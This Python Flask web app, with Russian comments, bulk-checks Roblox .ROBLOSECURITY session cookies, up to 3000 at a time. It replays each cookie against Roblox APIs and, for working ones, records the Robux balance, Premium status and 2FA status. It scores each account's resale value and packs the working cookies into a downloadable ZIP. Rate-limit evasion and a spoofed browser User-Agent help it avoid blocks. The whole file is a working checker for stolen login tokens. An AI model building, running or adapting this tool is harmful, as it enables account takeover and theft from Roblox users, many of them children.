import os
import json
import zipfile
import io
import sqlite3
import random
from datetime import datetime, timedelta
from flask import Flask, render_template, request, jsonify, send_file
import requests
import time
import re
import hashlib
import uuid
from concurrent.futures import ThreadPoolExecutor, as_completed

app = Flask(__name__)
app.config['SECRET_KEY'] = os.environ.get('SECRET_KEY', 'dev-secret-key')
app.config['DATABASE'] = os.environ.get('DATABASE_URL', 'checker_history.db').replace('postgres://', 'sqlite:///') if os.environ.get('DATABASE_URL', '').startswith('postgres://') else 'checker_history.db'

# Исправляем SQLite URL для Railway
if app.config['DATABASE'].startswith('sqlite:///'):
    app.config['DATABASE'] = app.config['DATABASE'].replace('sqlite:///', '')

# Глобальная статистика
global_stats = {
    'total_checked': 0,
    'valid_accounts': 0,
    'active_users': set(),
    'last_reset': datetime.now().isoformat()
}

# Инициализация базы данных
def init_db():
    try:
        conn = sqlite3.connect(app.config['DATABASE'])
        c = conn.cursor()
        c.execute('''
            CREATE TABLE IF NOT EXISTS check_history (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                session_id TEXT UNIQUE,
                user_id TEXT,
                total_cookies INTEGER,
                valid_cookies INTEGER,
                check_date TEXT,
                results TEXT
            )
        ''')
        c.execute('''
            CREATE TABLE IF NOT EXISTS user_sessions (
                user_id TEXT PRIMARY KEY,
                created_date TEXT,
                last_active TEXT
            )
        ''')
        c.execute('''
            CREATE TABLE IF NOT EXISTS global_stats (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                total_checked INTEGER DEFAULT 0,
                valid_accounts INTEGER DEFAULT 0,
                unique_users INTEGER DEFAULT 0,
                last_updated TEXT
            )
        ''')
        conn.commit()
        conn.close()
        print("Database initialized successfully")
    except Exception as e:
        print(f"Database initialization error: {e}")

# Инициализируем базу при запуске
init_db()

def update_global_stats(total_checked=0, valid_accounts=0):
    """Обновление глобальной статистики"""
    try:
        conn = sqlite3.connect(app.config['DATABASE'])
        c = conn.cursor()
        now = datetime.now().isoformat()
        
        c.execute('SELECT * FROM global_stats WHERE id = 1')
        existing = c.fetchone()
        
        if existing:
            c.execute('''
                UPDATE global_stats SET 
                total_checked = total_checked + ?,
                valid_accounts = valid_accounts + ?,
                last_updated = ?
                WHERE id = 1
            ''', (total_checked, valid_accounts, now))
        else:
            c.execute('''
                INSERT INTO global_stats (total_checked, valid_accounts, unique_users, last_updated)
                VALUES (?, ?, 1, ?)
            ''', (total_checked, valid_accounts, now))
        
        conn.commit()
        conn.close()
    except Exception as e:
        print(f"Error updating global stats: {e}")

def get_global_stats():
    """Получение глобальной статистики"""
    try:
        conn = sqlite3.connect(app.config['DATABASE'])
        c = conn.cursor()
        c.execute('SELECT * FROM global_stats WHERE id = 1')
        result = c.fetchone()
        conn.close()
        
        if result:
            return {
                'total_checked': result[1],
                'valid_accounts': result[2],
                'unique_users': result[3],
                'last_updated': result[4]
            }
        return {'total_checked': 0, 'valid_accounts': 0, 'unique_users': 0, 'last_updated': datetime.now().isoformat()}
    except Exception as e:
        print(f"Error getting global stats: {e}")
        return {'total_checked': 0, 'valid_accounts': 0, 'unique_users': 0, 'last_updated': datetime.now().isoformat()}

def get_user_id():
    """Генерируем уникальный ID пользователя на основе IP и User-Agent"""
    try:
        ip = request.headers.get('X-Forwarded-For', request.remote_addr)
        user_agent = request.headers.get('User-Agent', '')
        unique_string = f"{ip}-{user_agent}"
        return hashlib.md5(unique_string.encode()).hexdigest()
    except:
        return str(uuid.uuid4())

def save_user_session(user_id):
    """Сохраняем/обновляем сессию пользователя"""
    try:
        conn = sqlite3.connect(app.config['DATABASE'])
        c = conn.cursor()
        now = datetime.now().isoformat()
        c.execute('''
            INSERT OR REPLACE INTO user_sessions 
            (user_id, created_date, last_active)
            VALUES (?, COALESCE((SELECT created_date FROM user_sessions WHERE user_id = ?), ?), ?)
        ''', (user_id, user_id, now, now))
        conn.commit()
        conn.close()
        
        # Обновляем статистику уникальных пользователей
        update_unique_users()
    except Exception as e:
        print(f"Error saving user session: {e}")

def update_unique_users():
    """Обновление количества уникальных пользователей"""
    try:
        conn = sqlite3.connect(app.config['DATABASE'])
        c = conn.cursor()
        c.execute('SELECT COUNT(*) FROM user_sessions')
        count = c.fetchone()[0]
        
        c.execute('UPDATE global_stats SET unique_users = ? WHERE id = 1', (count,))
        conn.commit()
        conn.close()
    except Exception as e:
        print(f"Error updating unique users: {e}")

def save_check_session(session_id, user_id, total, valid, results):
    """Сохраняем проверку с привязкой к пользователю"""
    try:
        conn = sqlite3.connect(app.config['DATABASE'])
        c = conn.cursor()
        c.execute('''
            INSERT OR REPLACE INTO check_history 
            (session_id, user_id, total_cookies, valid_cookies, check_date, results)
            VALUES (?, ?, ?, ?, ?, ?)
        ''', (session_id, user_id, total, valid, datetime.now().isoformat(), json.dumps(results)))
        conn.commit()
        conn.close()
        
        # Обновляем глобальную статистику
        update_global_stats(total, valid)
        return True
    except Exception as e:
        print(f"Error saving session: {e}")
        return False

def get_user_history(user_id, limit=20):
    """Получаем историю только для конкретного пользователя"""
    try:
        conn = sqlite3.connect(app.config['DATABASE'])
        c = conn.cursor()
        c.execute('''
            SELECT * FROM check_history 
            WHERE user_id = ?
            ORDER BY check_date DESC 
            LIMIT ?
        ''', (user_id, limit))
        history = c.fetchall()
        conn.close()
        
        result = []
        for item in history:
            result.append({
                'id': item[0],
                'session_id': item[1],
                'user_id': item[2],
                'total_cookies': item[3],
                'valid_cookies': item[4],
                'check_date': item[5],
                'results': json.loads(item[6]) if item[6] else []
            })
        return result
    except Exception as e:
        print(f"Error getting user history: {e}")
        return []

def get_session_results(session_id, user_id):
    """Получаем результаты сессии с проверкой пользователя"""
    try:
        conn = sqlite3.connect(app.config['DATABASE'])
        c = conn.cursor()
        c.execute('SELECT results FROM check_history WHERE session_id = ? AND user_id = ?', (session_id, user_id))
        result = c.fetchone()
        conn.close()
        return json.loads(result[0]) if result else None
    except Exception as e:
        print(f"Error getting session results: {e}")
        return None

class AdvancedRobloxChecker:
    def __init__(self):
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Accept': 'application/json, text/plain, */*',
            'Accept-Language': 'en-US,en;q=0.9',
            'Origin': 'https://www.roblox.com',
            'Referer': 'https://www.roblox.com/',
        })
        self.timeout = 30
        self.last_request_time = 0
        self.request_delay = 2  # Базовая задержка между запросами

    def get_csrf_token(self, cookie):
        """Получение CSRF токена"""
        try:
            response = self.session.post(
                'https://auth.roblox.com/v2/login',
                headers={'Cookie': f'.ROBLOSECURITY={cookie}'},
                timeout=10
            )
            if 'x-csrf-token' in response.headers:
                return response.headers['x-csrf-token']
        except Exception as e:
            print(f"CSRF token error: {e}")
        return ''.join(random.choices('ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789', k=32))

    def rate_limit(self):
        """Контроль частоты запросов"""
        current_time = time.time()
        elapsed = current_time - self.last_request_time
        if elapsed < self.request_delay:
            time.sleep(self.request_delay - elapsed)
        self.last_request_time = time.time()

    def handle_rate_limit(self, wait_time=30):
        """Обработка ограничения запросов"""
        print(f"Rate limit detected, waiting {wait_time} seconds...")
        time.sleep(wait_time)
        self.request_delay += 1  # Увеличиваем задержку

    def check_single_cookie(self, cookie):
        """Проверка одной куки с улучшенной валидацией"""
        cookie = cookie.strip()
        
        # Базовая валидация формата куки
        if not cookie or len(cookie) < 100:
            return self.error_result(cookie, 'Invalid cookie format (too short)')
            
        if cookie.startswith('"') and cookie.endswith('"'):
            cookie = cookie[1:-1]
        
        # Проверяем базовую структуру куки
        if not cookie.startswith('_|WARNING:-DO-NOT-SHARE-THIS.'):
            return self.error_result(cookie, 'Invalid cookie format (missing warning)')
        
        headers = {
            'Cookie': f'.ROBLOSECURITY={cookie}',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
        }
        
        try:
            # Получаем CSRF токен
            csrf_token = self.get_csrf_token(cookie)
            headers['X-CSRF-TOKEN'] = csrf_token
            
            # Контроль частоты запросов
            self.rate_limit()
            
            # Проверка аутентификации
            auth_response = self.session.get(
                'https://users.roblox.com/v1/users/authenticated',
                headers=headers,
                timeout=self.timeout
            )
            
            if auth_response.status_code == 401:
                return self.error_result(cookie, 'Invalid cookie (Unauthorized)')
            elif auth_response.status_code == 403:
                # Пробуем получить CSRF токен другим способом
                try:
                    csrf_response = self.session.post(
                        'https://auth.roblox.com/v2/login',
                        headers={'Cookie': f'.ROBLOSECURITY={cookie}'},
                        timeout=5
                    )
                    if 'x-csrf-token' in csrf_response.headers:
                        headers['X-CSRF-TOKEN'] = csrf_response.headers['x-csrf-token']
                        auth_response = self.session.get(
                            'https://users.roblox.com/v1/users/authenticated',
                            headers=headers,
                            timeout=self.timeout
                        )
                except:
                    pass
                
                if auth_response.status_code == 403:
                    return self.error_result(cookie, 'Cookie blocked by Roblox (403)')
            elif auth_response.status_code == 429:
                self.handle_rate_limit(30)
                # Повторяем запрос после ожидания
                auth_response = self.session.get(
                    'https://users.roblox.com/v1/users/authenticated',
                    headers=headers,
                    timeout=self.timeout
                )
            elif auth_response.status_code != 200:
                return self.error_result(cookie, f'Auth failed: {auth_response.status_code}')
            
            auth_data = auth_response.json()
            if not auth_data.get('id'):
                return self.error_result(cookie, 'Invalid user data in response')
            
            user_id = auth_data['id']
            
            # Получение информации последовательно
            profile_data = self.get_profile_info(headers, user_id)
            economy_data = self.get_economy_info(headers, user_id)
            premium_data = self.get_premium_status(headers, user_id)
            friends_data = self.get_friends_count(headers, user_id)
            is_2fa_enabled = self.check_2fa_status(headers, user_id)
            
            # Дополнительная проверка валидности данных
            if not auth_data.get('name'):
                return self.error_result(cookie, 'Invalid account data (no username)')
            
            # Расчет метрик
            account_age = self.calculate_account_age(auth_data.get('created'))
            account_value = self.calculate_account_value(
                economy_data['robux'],
                premium_data['isPremium'],
                account_age['years'],
                friends_data['count']
            )
            
            return {
                'valid': True,
                'cookie': cookie,
                'account_info': {
                    'username': auth_data.get('name', 'N/A'),
                    'display_name': auth_data.get('displayName', auth_data.get('name', 'N/A')),
                    'user_id': user_id,
                    'profile_url': f'https://www.roblox.com/users/{user_id}/profile',
                    'created_date': account_age['formatted_date'],
                    'account_age_days': account_age['days'],
                    'account_age_years': account_age['years']
                },
                'economy': {
                    'robux_balance': economy_data['robux'],
                    'pending_robux': economy_data.get('pending_robux', 0),
                    'total_robux': economy_data['robux'] + economy_data.get('pending_robux', 0),
                },
                'premium': premium_data,
                'security': {
                    '2fa_enabled': is_2fa_enabled,
                },
                'social': {
                    'friends_count': friends_data['count'],
                    'followers_count': profile_data.get('followers_count', 0),
                    'following_count': profile_data.get('following_count', 0),
                },
                'account_value': account_value,
                'checked_at': datetime.now().isoformat()
            }

        except requests.exceptions.Timeout:
            return self.error_result(cookie, 'Request timeout (server too slow)')
        except requests.exceptions.ConnectionError:
            return self.error_result(cookie, 'Connection error (network issue)')
        except Exception as e:
            return self.error_result(cookie, f"Check error: {str(e)}")

    def get_profile_info(self, headers, user_id):
        """Информация о профиле"""
        try:
            self.rate_limit()
            response = self.session.get(
                f'https://users.roblox.com/v1/users/{user_id}',
                headers=headers,
                timeout=10
            )
            if response.status_code == 200:
                data = response.json()
                return {
                    'followers_count': data.get('followersCount', 0),
                    'following_count': data.get('followingsCount', 0),
                    'description': data.get('description', ''),
                    'is_banned': data.get('isBanned', False)
                }
        except Exception as e:
            print(f"Profile info error: {e}")
        return {'followers_count': 0, 'following_count': 0, 'description': '', 'is_banned': False}

    def get_economy_info(self, headers, user_id):
        """Информация об экономике"""
        try:
            self.rate_limit()
            response = self.session.get(
                'https://economy.roblox.com/v1/users/currency',
                headers=headers,
                timeout=10
            )
            if response.status_code == 200:
                data = response.json()
                return {
                    'robux': data.get('robux', 0),
                    'pending_robux': data.get('pendingRobux', 0)
                }
            elif response.status_code == 429:
                self.handle_rate_limit(30)
                return self.get_economy_info(headers, user_id)
        except Exception as e:
            print(f"Economy info error: {e}")
        return {'robux': 0, 'pending_robux': 0}

    def get_premium_status(self, headers, user_id):
        """Статус Premium"""
        try:
            self.rate_limit()
            response = self.session.get(
                f'https://premiumfeatures.roblox.com/v1/users/{user_id}/premium',
                headers=headers,
                timeout=10
            )
            if response.status_code == 200:
                data = response.json()
                return {
                    'isPremium': data.get('isPremium', False),
                    'status': 'Active' if data.get('isPremium') else 'Inactive'
                }
            elif response.status_code == 429:
                self.handle_rate_limit(30)
                return self.get_premium_status(headers, user_id)
        except Exception as e:
            print(f"Premium status error: {e}")
        return {'isPremium': False, 'status': 'Inactive'}

    def get_friends_count(self, headers, user_id):
        """Количество друзей"""
        try:
            self.rate_limit()
            response = self.session.get(
                f'https://friends.roblox.com/v1/users/{user_id}/friends/count',
                headers=headers,
                timeout=10
            )
            if response.status_code == 200:
                data = response.json()
                return {'count': data.get('count', 0)}
            elif response.status_code == 429:
                self.handle_rate_limit(30)
                return self.get_friends_count(headers, user_id)
        except Exception as e:
            print(f"Friends count error: {e}")
        return {'count': 0}

    def check_2fa_status(self, headers, user_id):
        """Проверка 2FA"""
        try:
            self.rate_limit()
            response = self.session.get(
                f'https://twostepverification.roblox.com/v1/users/{user_id}/configuration',
                headers=headers,
                timeout=5
            )
            if response.status_code == 200:
                data = response.json()
                return data.get('twoStepVerificationEnabled', False)
            elif response.status_code == 429:
                self.handle_rate_limit(30)
                return self.check_2fa_status(headers, user_id)
        except Exception as e:
            print(f"2FA check error: {e}")
            return False

    def calculate_account_age(self, created_date_str):
        """Расчет возраста аккаунта"""
        if not created_date_str:
            return {'days': 0, 'years': 0, 'formatted_date': 'Unknown'}
        
        try:
            created_date = datetime.fromisoformat(created_date_str.replace('Z', '+00:00'))
            now = datetime.now()
            
            age_delta = now - created_date
            age_days = age_delta.days
            age_years = age_days / 365.25
            
            return {
                'days': age_days,
                'years': round(age_years, 1),
                'formatted_date': created_date.strftime('%Y-%m-%d')
            }
        except Exception as e:
            print(f"Account age calculation error: {e}")
            return {'days': 0, 'years': 0, 'formatted_date': 'Unknown'}

    def calculate_account_value(self, robux, is_premium, age_years, friends_count):
        """Расчет стоимости аккаунта"""
        try:
            value = robux * 0.0035
            
            if is_premium:
                value += 500
            
            value += age_years * 300
            value += min(friends_count * 10, 1000)
            
            return round(max(value, 10), 2)
        except Exception as e:
            print(f"Account value calculation error: {e}")
            return 10.0

    def error_result(self, cookie: str, error: str):
        return {
            'valid': False,
            'cookie': cookie,
            'error': error,
            'checked_at': datetime.now().isoformat()
        }

    def check_multiple_cookies(self, cookies):
        """Проверка нескольких куки с использованием потоков"""
        results = []
        valid_cookies = []
        
        # Предварительная фильтрация куки
        for cookie in cookies:
            cookie = cookie.strip()
            if cookie and len(cookie) > 100 and cookie.startswith('_|WARNING:-DO-NOT-SHARE-THIS.'):
                valid_cookies.append(cookie)
        
        if not valid_cookies:
            return [self.error_result("", "No valid cookies found")]
        
        # Ограничиваем количество одновременных проверок для избежания блокировки
        max_workers = min(3, len(valid_cookies))
        
        with ThreadPoolExecutor(max_workers=max_workers) as executor:
            future_to_cookie = {
                executor.submit(self.check_single_cookie, cookie): cookie 
                for cookie in valid_cookies
            }
            
            for future in as_completed(future_to_cookie):
                try:
                    result = future.result()
                    results.append(result)
                    # Задержка между запросами для избежания блокировки
                    time.sleep(1.5)
                except Exception as e:
                    cookie = future_to_cookie[future]
                    results.append(self.error_result(cookie, f"Check failed: {str(e)}"))
                    time.sleep(1)
        
        return results

checker = AdvancedRobloxChecker()

# Маршруты
@app.route('/')
def index():
    return render_template('index.html')

@app.route('/health')
def health_check():
    """Health check endpoint for Railway"""
    return jsonify({'status': 'healthy', 'timestamp': datetime.now().isoformat()})

@app.route('/api/global_stats')
def api_global_stats():
    """API для получения глобальной статистики"""
    try:
        stats = get_global_stats()
        return jsonify(stats)
    except Exception as e:
        return jsonify({'error': f'Stats error: {str(e)}'}), 500

@app.route('/api/history')
def api_history():
    """API для получения истории пользователя"""
    try:
        user_id = get_user_id()
        save_user_session(user_id)
        check_history = get_user_history(user_id, 20)
        return jsonify(check_history)
    except Exception as e:
        return jsonify({'error': f'Database error: {str(e)}'}), 500

@app.route('/api/check', methods=['POST'])
def api_check_cookies():
    """API для проверки куки"""
    try:
        user_id = get_user_id()
        save_user_session(user_id)
        
        data = request.get_json()
        
        if not data or 'cookies' not in data:
            return jsonify({'error': 'No cookies provided'}), 400
        
        cookies = data['cookies']
        
        if isinstance(cookies, str):
            cookies = [cookies]
        
        cookies = [cookie.strip() for cookie in cookies if cookie.strip()]
        
        if not cookies:
            return jsonify({'error': 'No valid cookies provided'}), 400
        
        if len(cookies) > 3000:  # Увеличили лимит до 3000
            return jsonify({'error': 'Too many cookies. Maximum 3000 per request.'}), 400
        
        # Используем многопоточную проверку
        results = checker.check_multiple_cookies(cookies)
        
        session_id = datetime.now().strftime('%Y%m%d_%H%M%S_') + ''.join(random.choices('0123456789abcdef', k=8))
        valid_count = len([r for r in results if r.get('valid', False)])
        
        # Сохраняем в базу с привязкой к пользователю
        save_success = save_check_session(session_id, user_id, len(cookies), valid_count, results)
        
        if not save_success:
            return jsonify({'error': 'Failed to save results to database'}), 500
        
        return jsonify({
            'total': len(results),
            'valid': valid_count,
            'invalid': len(results) - valid_count,
            'results': results,
            'session_id': session_id,
            'checked_at': datetime.now().isoformat()
        })
    
    except Exception as e:
        print(f"API check error: {e}")
        return jsonify({'error': f'Server error: {str(e)}'}), 500

@app.route('/api/download/<session_id>')
def api_download_results(session_id):
    """API для скачивания результатов"""
    try:
        user_id = get_user_id()
        results = get_session_results(session_id, user_id)
        if not results:
            return jsonify({'error': 'Results not found'}), 404
        
        valid_cookies = [r for r in results if r.get('valid')]
        
        if not valid_cookies:
            return jsonify({'error': 'No valid cookies'}), 400
        
        zip_buffer = io.BytesIO()
        
        with zipfile.ZipFile(zip_buffer, 'w', zipfile.ZIP_DEFLATED) as zip_file:
            # Файл с валидными куками
            all_cookies_content = "\n".join([r['cookie'] for r in valid_cookies])
            zip_file.writestr('valid_cookies.txt', all_cookies_content)
            
            # Подробный отчет
            detailed_report = {
                'check_date': datetime.now().isoformat(),
                'session_id': session_id,
                'summary': {
                    'total_checked': len(results),
                    'valid': len(valid_cookies),
                    'invalid': len([r for r in results if not r['valid']])
                },
                'valid_accounts': []
            }
            
            for result in valid_cookies:
                detailed_report['valid_accounts'].append({
                    'username': result['account_info']['username'],
                    'user_id': result['account_info']['user_id'],
                    'robux': result['economy']['total_robux'],
                    'premium': result['premium']['isPremium'],
                    'account_value': result['account_value'],
                    'cookie_preview': result['cookie'][:50] + '...'
                })
            
            zip_file.writestr('detailed_report.json', json.dumps(detailed_report, indent=2, ensure_ascii=False))
            
        zip_buffer.seek(0)
        
        filename = f'roblox_cookies_{session_id}.zip'
        
        return send_file(
            zip_buffer,
            as_attachment=True,
            download_name=filename,
            mimetype='application/zip'
        )
        
    except Exception as e:
        print(f"Download error: {e}")
        return jsonify({'error': f'Archive error: {str(e)}'}), 500

@app.route('/api/session/<session_id>')
def api_get_session(session_id):
    """API для получения результатов сессии"""
    try:
        user_id = get_user_id()
        results = get_session_results(session_id, user_id)
        if results:
            valid_count = len([r for r in results if r.get('valid', False)])
            return jsonify({
                'total': len(results),
                'valid': valid_count,
                'invalid': len(results) - valid_count,
                'results': results
            })
        return jsonify({'error': 'Session not found'}), 404
    except Exception as e:
        print(f"Session error: {e}")
        return jsonify({'error': f'Database error: {str(e)}'}), 500

@app.route('/api/delete/<session_id>', methods=['DELETE'])
def api_delete_session(session_id):
    """API для удаления сессии"""
    try:
        user_id = get_user_id()
        conn = sqlite3.connect(app.config['DATABASE'])
        c = conn.cursor()
        c.execute('DELETE FROM check_history WHERE session_id = ? AND user_id = ?', (session_id, user_id))
        conn.commit()
        conn.close()
        return jsonify({'success': True})
    except Exception as e:
        print(f"Delete error: {e}")
        return jsonify({'error': f'Delete failed: {str(e)}'}), 500

@app.route('/api/stats')
def api_stats():
    """API для получения статистики"""
    try:
        user_id = get_user_id()
        history = get_user_history(user_id, 100)
        
        total_checks = len(history)
        total_cookies = sum(check['total_cookies'] for check in history)
        valid_cookies = sum(check['valid_cookies'] for check in history)
        
        return jsonify({
            'total_checks': total_checks,
            'total_cookies': total_cookies,
            'valid_cookies': valid_cookies,
            'success_rate': round((valid_cookies / total_cookies * 100) if total_cookies > 0 else 0, 1)
        })
    except Exception as e:
        return jsonify({'error': f'Stats error: {str(e)}'}), 500

@app.errorhandler(404)
def not_found(error):
    return jsonify({'error': 'Endpoint not found'}), 404

@app.errorhandler(500)
def internal_error(error):
    return jsonify({'error': 'Internal server error'}), 500

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    debug = os.environ.get('DEBUG', 'False').lower() == 'true'
    
    # Для Railway важно слушать на 0.0.0.0
    app.run(host='0.0.0.0', port=port, debug=debug, threaded=True)